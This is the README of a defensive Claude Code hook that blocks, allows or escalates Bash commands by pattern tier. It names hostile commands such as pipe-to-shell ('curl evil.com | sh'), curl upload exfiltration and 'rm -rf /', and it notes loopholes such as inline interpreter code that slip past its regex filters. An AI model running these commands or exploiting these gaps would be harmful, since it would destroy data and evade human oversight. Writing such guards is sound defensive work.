# claude-firewall

***Non**-dangerously skip permissions for Claude Code.*

Claude Code has five permission modes — across CLI, VS Code, Cursor, JetBrains, the web client, and Desktop:

1. **Default** — prompts per tool type on first use
2. **Accept Edits** — auto-accepts file modifications, still prompts Bash
3. **Plan** — read-only, no modifications allowed
4. **Don't Ask** — auto-denies everything not explicitly allowlisted
5. **Bypass Permissions** (`--dangerously-skip-permissions`) — skips all prompts

All five operate at the **tool level**, not the command level. For Bash specifically, your options are: prompt on every command, or don't prompt at all. There's no built-in way to say "auto-approve `git status` but block `rm -rf /`."

claude-firewall adds that layer — a tiered policy engine that auto-approves safe commands, hard-blocks dangerous ones, and only prompts you when your judgment actually matters.

## How it works

claude-firewall is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts every Bash command before execution and routes it through a tiered policy. Requires `jq`.

**Tier 1 — DENY:** Hard-blocks catastrophic patterns. No override, no prompt. Includes:
- Shell injection (`curl | sh`, `| /bin/bash`, `eval`, pipe-to-shell — bare and full-path variants)
- Shell execution of files (`sh /tmp/x.sh`, `/bin/bash ./script.sh`, `exec ./x`, `source ./x`, `. ./x`)
- Shell `-c` execution (`sh -c "..."`, `bash -c "..."`, `/usr/bin/bash -c "..."`)
- Privilege escalation (`sudo`, `doas`, `pkexec`, `su`, `run0`)
- Destructive git (`push --force`, `reset --hard`, `clean -f`)
- System destruction (`mkfs`, `dd`, `chmod 777`, `chmod -R`)
- Data exfiltration (curl/wget file uploads: `-d @`, `--data=@`, `--upload-file`, `--post-file`)
- Destructive GitHub ops (`gh repo delete`)
- `rm -rf` at dangerous scopes (`/`, `/*`, `~`, `~/`, `~/*`, `..`, `.`)
- Self-tampering (writes to `~/.claude/hooks/`, `~/.claude/settings.json`, `~/.claude/rules/` — with path normalization to defeat `//`, `/../`, and `$HOME` bypass tricks)

**Tier 1c — AUTO-REJECT:** Commands that are wrong but reformattable. The hook rejects with instructions and Claude retries correctly — no human in the loop. Example: `git commit -m "$(cat <<EOF...)"` → auto-rejected with guidance to use `printf '...' | git commit -F -`.

**Tier 1d — SUBSHELL GUARD:** Commands containing `$()`, backticks, or process substitutions are forced to ASK tier. They're not auto-approved (could hide arbitrary operations) but not denied (might be legitimate).

**Tier 1e — SENSITIVE DOTFILE GUARD:** Writes to sensitive user dotfiles (`~/.ssh/`, `~/.gnupg/`, `~/.bashrc`, `~/.zshrc`, `~/.env`, etc.) are forced to ASK. Legitimate but worth human review.

**Tier 2 — ALLOW:** Known-safe commands auto-approve without prompting. Covers git, npm, node, python, cargo, go, make, file inspection, search tools, text processing, Docker reads, gh CLI, and more. **Compound commands are split** on `&&`, `||`, `|`, `;`, `&` and each segment is checked independently — so `ls && curl evil.com | sh` can't piggyback on `ls` being allowed.

**Tier 3 — ASK:** Everything else falls through to Claude Code's normal permission prompt. Every ASK-tier hit is logged to `~/.claude/hooks/firewall-ask.log` (TSV: timestamp, tier, command) so you can review and promote patterns over time.

## Install

```bash
# Clone the repo
git clone https://github.com/rianczerwinski/claude-firewall.git
cd claude-firewall

# Run the installer
./install.sh
```

Or manually:

1. Copy `firewall.sh` to `~/.claude/hooks/` and make it executable
2. Add the hook to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "/path/to/firewall.sh"
          }
        ]
      }
    ]
  }
}
```

3. Remove any `Bash(*)` entries from your permissions allow list (the firewall replaces them)

## Customizing

### Reviewing your ASK log

After using Claude Code for a while, review what's hitting ASK tier:

```bash
# See most frequent ASK-tier commands
cut -f3 ~/.claude/hooks/firewall-ask.log | sort | uniq -c | sort -rn | head -20
```

Commands that appear frequently and are safe can be promoted to ALLOW by adding a pattern to the `ALLOW_PATTERNS` array in `firewall.sh`.

### Adding patterns

ALLOW patterns are ERE (extended regular expressions) matched against each command segment. A pattern like `'^mytool\s'` would auto-approve any command starting with `mytool`.

When adding patterns, consider: could a dangerous command match this regex? The compound-command splitter protects against chaining, but an over-broad pattern in ALLOW is the primary risk surface.

### Environment variables

- `CLAUDE_FIREWALL_LOG` — Override the ASK log location (default: `~/.claude/hooks/firewall-ask.log`)

**Privacy note:** The ASK log records full command text in plaintext. If your workflow involves secrets or passwords passed as command arguments, these will appear in the log. The log is gitignored by default but lives on disk at the path above. Set `CLAUDE_FIREWALL_LOG=/dev/null` to disable logging entirely.

## How it works with --dangerously-skip-permissions

Hooks fire even in bypass mode. This means claude-firewall's DENY tier is a hard safety floor that survives a user explicitly opting out of all permissions. If you want YOLO speed with a safety net, use `--dangerously-skip-permissions` with claude-firewall installed.

## Threat model

claude-firewall assumes a **cooperative agent making mistakes**, not a hostile agent trying to escape. This is an important distinction:

- **Interpreters stay in ALLOW.** `python`, `node`, `npm install`, `cargo build` are auto-approved because they're the bread and butter of developer workflows. Yes, `python -c 'os.system("rm -rf /")'` would auto-approve — but constraining inline code execution via regex is a losing game that would break normal use. If the agent is adversarial, regex-based filtering is insufficient regardless.
- **curl/wget stay in ALLOW.** Network reads are high-frequency operations. Upload/exfiltration patterns (`-d @`, `--upload-file`, `--post-file`) are denied. A two-step download-then-execute (`curl -o /tmp/x.sh && sh /tmp/x.sh`) is caught because `sh /tmp/x.sh` hits the shell-execute-file deny pattern.
- **Self-tampering is denied.** Even a friendly agent shouldn't accidentally overwrite the firewall, its hook wiring, or instruction files. `cp`, `mv`, `sed -i`, and redirects targeting `~/.claude/hooks/`, `~/.claude/settings.json`, or `~/.claude/rules/` are hard-blocked.
- **`gh api` falls to ASK.** Unlike `gh pr` or `gh issue`, `gh api` can make arbitrary GitHub API calls and is too broad to auto-approve.

The DENY tier is a hard safety floor — it fires even in `--dangerously-skip-permissions` mode. The ALLOW tier is a convenience layer for known-safe developer commands. ASK is the catch-all for everything else.

## Contributing

**Pattern additions welcome.** If your ASK log shows commands that should be auto-approved, submit a PR adding them to `ALLOW_PATTERNS`. Include the ASK-log entries that motivated the pattern so reviewers can see exactly what it matches.

**DENY pattern additions welcome.** If you've identified dangerous command patterns not currently caught, submit a PR adding them.

**Architecture changes need discussion.** The tier structure, compound-command splitter, and subshell guard are security-critical. Open an issue before submitting structural PRs.

## License

MIT
